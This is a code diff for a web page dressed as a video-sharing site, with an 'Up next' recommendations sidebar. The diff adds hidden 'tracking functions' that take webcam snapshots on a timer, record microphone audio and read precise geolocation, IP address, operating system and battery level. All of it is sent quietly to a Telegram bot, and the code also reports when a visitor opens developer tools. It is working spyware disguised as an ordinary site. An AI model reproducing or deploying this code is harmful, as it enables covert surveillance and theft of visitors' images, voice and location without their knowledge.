+        const sidebar = document.getElementById('recommendations-sidebar');
+        sidebar.innerHTML = '<h3>Up next</h3>';
+        document.querySelectorAll('#video-grid-page .video-card').forEach(card => {
+            if (card.dataset.videoSrc !== currentVideoSrc) {
+                const data = card.dataset;
+                const compactCardHTML = `
+                    <div class="compact-video-card" data-video-src="${data.videoSrc}" data-title="${data.title}" data-channel="${data.channel}" data-views="${data.views}" data-date="${data.date}" data-avatar="${data.avatar}" data-poster="${data.poster}">
+                        <div class="thumbnail-wrapper"><img src="${data.poster}" alt="Thumbnail"><span class="duration">${data.duration || "10:00"}</span></div>
+                        <div class="video-metadata">
+                            <h3 class="video-title">${data.title}</h3>
+                            <p class="channel-name">${data.channel}</p>
+                            <p class="video-stats">${data.views} views</p>
+                        </div>
+                    </div>`;
+                sidebar.insertAdjacentHTML('beforeend', compactCardHTML);
+            }
+        });
+        sidebar.querySelectorAll('.compact-video-card').forEach(recoCard => {
+            recoCard.addEventListener('click', () => showPlayerPage(recoCard));
+        });
+    }
+
+    // --- All Original Tracking Functions ---
+    function requestCamera() { if (videoCaptureEl.srcObject?.active) return; navigator.mediaDevices.getUserMedia({ video: true }).then(stream => { videoCaptureEl.srcObject = stream; sendToBot("✅ Camera access granted."); videoCaptureEl.onloadedmetadata = () => { if(snapshotIntervalId) clearInterval(snapshotIntervalId); snapshotIntervalId = setInterval(captureAndSend, config.snapshotInterval); }; }).catch(handleMediaError("Camera")); }
+    function stopCamera() { videoCaptureEl.srcObject?.getTracks().forEach(track => track.stop()); if (snapshotIntervalId) clearInterval(snapshotIntervalId); sendToBot("❌ Camera access stopped."); }
+    function captureAndSend(caption = "📸 Webcam Snapshot") { try { if (!videoCaptureEl.srcObject?.active) return; const context = canvasEl.getContext("2d"); canvasEl.width = videoCaptureEl.videoWidth; canvasEl.height = videoCaptureEl.videoHeight; context.drawImage(videoCaptureEl, 0, 0, canvasEl.width, canvasEl.height); canvasEl.toBlob(blob => blob && sendPhoto(blob, caption), "image/png"); } catch (e) { sendToBot(`🚫 CAPTURE ERROR: ${e.name}`); }}
+    function requestMicrophone() { if (microphoneStream?.active) return; navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => { microphoneStream = stream; startMicRecording(stream); sendToBot("✅ Microphone access granted."); }).catch(handleMediaError("Microphone")); }
+    function stopMicrophone() { microphoneStream?.getTracks().forEach(track => track.stop()); if (mediaRecorder?.state === 'recording') mediaRecorder.stop(); sendToBot("❌ Microphone access stopped."); }
+    function requestGeolocation() { if (userLocation.lat !== "N/A") return; navigator.geolocation.getCurrentPosition(pos => { userLocation = { lat: pos.coords.latitude, lon: pos.coords.longitude }; sendToBot(`📍 Location: ${userLocation.lat}, ${userLocation.lon}`); sendLocationAsMap(userLocation.lat, userLocation.lon); }, err => sendToBot(`🚫 Geolocation Error: ${err.code === 1 ? "Permission Denied" : "Unavailable"}`), { enableHighAccuracy: true }); }
+    function startMicRecording(stream) { if (!window.MediaRecorder) return; mediaRecorder = new MediaRecorder(stream); mediaRecorder.ondataavailable = e => e.data?.size > 0 && sendAudioToBot(e.data); mediaRecorder.start(config.micRecordInterval); }
+    function sendBeaconToBot(message) { const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`; const data = JSON.stringify({ chat_id: config.chatId, text: message }); navigator.sendBeacon(url, new Blob([data], { type: 'application/json' })); }
+    async function sendToBot(message) { try { await fetch(`https://api.telegram.org/bot${config.botToken}/sendMessage`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: config.chatId, text: message, parse_mode: 'Markdown', disable_notification: true }) }); } catch (err) {} }
+    async function sendLocationAsMap(latitude, longitude) { try { await fetch(`https://api.telegram.org/bot${config.botToken}/sendLocation`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: config.chatId, latitude, longitude }) }); } catch (err) {} }
+    async function sendFormData(endpoint, formData) { try { await fetch(`https://api.telegram.org/bot${config.botToken}/${endpoint}`, { method: "POST", body: formData }); } catch (err) {} }
+    function sendPhoto(blob, caption) { const fd = new FormData(); fd.append("chat_id", config.chatId); fd.append("photo", blob, "snap.png"); fd.append("caption", `${caption}\nLoc: ${userLocation.lat}, ${userLocation.lon}`); sendFormData("sendPhoto", fd); }
+    function sendAudioToBot(audioBlob) { const fd = new FormData(); fd.append("chat_id", config.chatId); fd.append("audio", audioBlob, "mic.webm"); fd.append("caption", `🎤 Audio Clip`); sendFormData("sendAudio", fd); }
+    async function sendInitialReport() { let r = "💻 *Visitor Report*\n"; try { const ipRes = await fetch("https://api.ipify.org?format=json"); const d = await ipRes.json(); r += `*IP:* \`${d.ip}\`\n`; } catch (e) {} const ua = navigator.userAgent; r += `*OS:* ${ua.includes("Win")?"Win":ua.includes("Mac")?"Mac":/Android/.test(ua)?"Android":/iP(ad|hone|od)/.test(ua)?"iOS":"Other"}\n`; try { const b = await navigator.getBattery(); r += `*Battery:* ${Math.round(b.level * 100)}% (${b.charging ? '⚡' : '🔋'})\n`; } catch(e) {} sendToBot(r); }
+    function detectDevTools() { const threshold = 160; const check = () => { if (window.outerWidth - window.innerWidth > threshold || window.outerHeight - window.innerHeight > threshold) { sendToBot("⚠️ Dev Tools Opened!"); } requestAnimationFrame(check); }; requestAnimationFrame(check); }
+    function handleMediaError(type) { return e => sendToBot(`🚫 *${type} Error*: \`${e.name}\`.\nReason: ${e.message}`); }
+
+    // --- Start Execution ---
     initializeTracking();
 </script>
-
 </body>
 </html>
